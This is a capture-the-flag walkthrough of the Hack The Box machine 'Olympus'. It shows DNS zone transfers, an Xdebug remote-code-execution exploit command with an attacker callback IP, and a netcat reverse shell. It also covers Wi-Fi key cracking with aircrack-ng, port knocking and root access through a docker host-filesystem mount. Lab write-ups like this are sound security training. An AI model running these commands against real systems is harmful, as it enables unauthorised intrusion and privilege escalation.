## HTB Olympus (Medium) - Writeup

Difficulty: Medium

Olympus was a well-designed box involving DNS exploitation and Wi-Fi cracking, with containerization playing a key role throughout the journey.  
Privilege escalation was achieved through a misconfiguration, making for a solid and enjoyable challenge.  
---

## Nmap 

#### The nmap scan revealed three open and one filtered port:

![obraz](https://github.com/user-attachments/assets/981edf0e-18d3-4d26-9ee1-a08c7fdad02c)




## Port 53 - DNS

We can try to look for hidden domain names with dig command:  
```
dig axfr @10.10.10.83 olympus.htb
dig @10.10.10.83 olympus.htb
```
![obraz](https://github.com/user-attachments/assets/b225b181-6a1f-423a-9784-0f70a2b06b59)

Domain name olympus.htb was just my guess based on HTB naming convention.  




## Port 80 - Website 

![obraz](https://github.com/user-attachments/assets/1c397e3e-bf48-4433-84ee-1aa3c1c3ed14)

It doesn't contain anything intresting, also feroxbuster didn't found anything.  

Let's take a look at the http response headers.  

![obraz](https://github.com/user-attachments/assets/712a3f78-565e-49db-8cca-12f3a595903d)

Xdebug looks promising, lets research it a bit.  
It turns out that xdebug is a php tool and 2.5.5 is a version.   

After a quick search I found an RCE exploit for this tool.  
```
https://github.com/vulhub/vulhub/blob/master/php/xdebug-rce/exp.py
```

Let's try to get basic code execution with it:  
```
python3 exp.py -t http://10.10.10.83/index.php -c 'shell_exec("id");' --dbgp-ip 10.10.14.14
```
![obraz](https://github.com/user-attachments/assets/f180588b-d66d-4cd5-9865-bfa444900d88)

It worked, now we can try to get a shell access, I'll try netcat shell first.  
We will start netcat listener on port 9005 and run:  

![obraz](https://github.com/user-attachments/assets/2ae2d5d6-6800-4ffa-bd86-23fbeb33efd9)

We were lucky, it turned out that our target had netcat with -e option installed which led to initial access.  

![obraz](https://github.com/user-attachments/assets/fc520114-fb0f-42b9-b3c2-25cc7ec499d0)

After a quick enumeration we see that it is likely a container, hostname is weird, and ip differs from the original one.  
Also python is not installed meaning we can't upgrade a terminal.  

![obraz](https://github.com/user-attachments/assets/a195cc26-f6c5-42e3-b5d0-bd80a9df3380)

After some enumeration we found .cap file, it 100% might contain something intresting.  
We will move this file with netcat, first we will start a listener on kali:    

![obraz](https://github.com/user-attachments/assets/b4fd7ee7-e889-4414-b778-25f8b834340e) 

and then run netcat on the target machine:  

![obraz](https://github.com/user-attachments/assets/7fc8f682-46e5-43c5-b504-7cb698af1d81)



## Wireshark - .cap Analysis

Now we can open this file with wireshark:  

![obraz](https://github.com/user-attachments/assets/b01848c2-4569-4ac0-98a4-317ab6bb6e85)  

It is a file containing traffic captured from the 802.11 protocol, which is the standard used for wireless Wi-Fi communication.  
Manually analyzing this file wouldn't be required here.  
We will use a tool called **aircrack-ng** to get wi-fi password.  
```
aircrack-ng file.cap -w /usr/share/wordlists/rockyou.txt
```
We have found a key "flightoficarus".   
Network name is "Too_cl0se_to_th3_Sun".  


## ssh shell as icarus

Combining these two informations and after some tries we found ssh access as "icarus" with password "Too_cl0se_to_th3_Sun".  
Notice we specified port 2222, because it was the open port for ssh on this machine.  

![obraz](https://github.com/user-attachments/assets/1b2f6a5d-1a76-457d-a5af-4bdd3eea7be7)

After some enumeration we found:  

![obraz](https://github.com/user-attachments/assets/f97ac847-a634-448e-ae59-c1aceccca40a)

Now we need to go back to port 53 enumeration with this domain name.  


## Back to port 53 - DNS

With new domain name we can try to perform zone transfer as port 53 is open.  

![obraz](https://github.com/user-attachments/assets/badfc957-22fe-4ca6-bb77-42815b453190)

It had a dns TXT record saying:  
```
"prometheus, open a temporal portal to Hades (3456 8234 62431) and St34l_th3_F1re!"
```

It looks like a password and numbers used for port knocking.  
port knocking is a mechanism used to protect netowork services.  
With a proper combination of three numbers we can "knock" a port to temporarily open it.  
Port 22 came from nmap as "filtered". We can try to knock it.  

![obraz](https://github.com/user-attachments/assets/ba01493e-986b-4c16-a60f-3a0ec480dabd)

The username was discovered by analyzing a DNS TXT record and recognizing the naming pattern based on Greek gods used in previous accounts.  



## Abusing docker to get root

Again quick enumeration led to basic founding.  
We're in "docker" group which allows us to run docker commands.  

![obraz](https://github.com/user-attachments/assets/1b52fdb6-a8c9-4b8d-b6a7-5676ba97a68b)

We can start with enumerating running docker containers.  

![obraz](https://github.com/user-attachments/assets/c8afc27d-aaea-4a23-b32a-525a478437c1)

There are three containers. I believe we have to use "rhodes" because this is the only hostname I haven't seen before on this machine.  
We can try to abuse it with this command:  
```
docker run -v /:/mountedroot -i -t rodhes bash
```
![obraz](https://github.com/user-attachments/assets/44bba0c6-bbb0-4567-ad2a-f70c3abc4e53)

## Command Explanation 
docker run --> Starts a new Docker container.  
-v /:/mountedroot --> Mounts the host's root filesystem / into the container at the path /mountedroot  
-i --> Runs the container in interactive mode.   
-t --> Allocates a pseudo-TTY  
rodhes --> The name of the Docker image used to create the container.  
bash --> The command to run inside the container.  

## Retrieving a flag

We mounted / to /mountedroot  
Meaning flag will be located in /mountedroot/root/root.txt  

![obraz](https://github.com/user-attachments/assets/24739d58-a4dd-4b30-a234-90da0b05e04c)

Thank you for reading!  







































